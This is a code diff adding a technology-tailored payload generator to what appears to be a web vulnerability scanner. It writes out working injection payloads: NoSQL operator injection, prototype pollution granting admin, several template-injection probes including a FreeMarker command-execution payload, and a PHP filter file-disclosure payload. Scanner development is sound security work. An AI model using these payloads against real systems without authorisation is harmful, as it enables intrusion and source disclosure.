@@ -754,3 +754,67 @@ class PayloadTemplateEngine:
 
         logger.info(f"[PayloadEngine] Total {len(all_payloads)} payloads for endpoint {url}")
         return all_payloads
+
+    def generate_tech_tailored_payloads(self, url: str, param_name: str, tech_hints: List[str]) -> List[PayloadTemplate]:
+        """
+        Generate technology-tailored payloads based on detected tech stack hints.
+        Adapts SSTI, NoSQL, and SQLi mutations for Node.js, Spring/Java, PHP/Laravel, or Python/Flask.
+        """
+        payloads: List[PayloadTemplate] = []
+        tech_str = " ".join(tech_hints).lower()
+
+        # Node.js / Express
+        if "node" in tech_str or "express" in tech_str or "react" in tech_str:
+            payloads.append(PayloadTemplate(
+                name="NodeJS_NoSQL_JSON_Obj", vuln_type="nosql_injection",
+                method="POST", url=url, json_data={param_name: {"$gt": ""}},
+                description="Node.js Express JSON body $gt NoSQL operator injection",
+                severity="high"
+            ))
+            payloads.append(PayloadTemplate(
+                name="NodeJS_Prototype_Pollution", vuln_type="mass_assignment",
+                method="POST", url=url, json_data={"__proto__": {"admin": True}},
+                description="Node.js global object prototype pollution probe",
+                severity="critical"
+            ))
+
+        # Spring / Java
+        if "java" in tech_str or "spring" in tech_str or "boot" in tech_str:
+            payloads.append(PayloadTemplate(
+                name="Spring_EL_SSTI", vuln_type="ssti_analysis",
+                method="GET", url=self._replace_param(url, param_name, "${7*7}"),
+                description="Spring Expression Language (SpEL) template evaluation payload",
+                severity="critical"
+            ))
+            payloads.append(PayloadTemplate(
+                name="FreeMarker_Execute_SSTI", vuln_type="ssti_analysis",
+                method="GET", url=self._replace_param(url, param_name, '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }'),
+                description="FreeMarker Java template utility execution payload",
+                severity="critical"
+            ))
+
+        # PHP / Laravel / WordPress
+        if "php" in tech_str or "laravel" in tech_str or "wordpress" in tech_str:
+            payloads.append(PayloadTemplate(
+                name="PHP_Smarty_Twig_SSTI", vuln_type="ssti_analysis",
+                method="GET", url=self._replace_param(url, param_name, "{{7*7}}"),
+                description="PHP Twig/Smarty template evaluation payload",
+                severity="critical"
+            ))
+            payloads.append(PayloadTemplate(
+                name="PHP_Filter_Wrapper_LFI", vuln_type="info_disclosure",
+                method="GET", url=self._replace_param(url, param_name, "php://filter/convert.base64-encode/resource=index.php"),
+                description="PHP Stream Filter Base64 LFI source disclosure probe",
+                severity="high"
+            ))
+
+        # Python / Flask / Django
+        if "python" in tech_str or "flask" in tech_str or "django" in tech_str:
+            payloads.append(PayloadTemplate(
+                name="Python_Jinja2_SSTI", vuln_type="ssti_analysis",
+                method="GET", url=self._replace_param(url, param_name, "{{7*'7'}}"),
+                description="Python Jinja2 template multiplication evaluation payload (7777777)",
+                severity="critical"
+            ))
+
+        return payloads
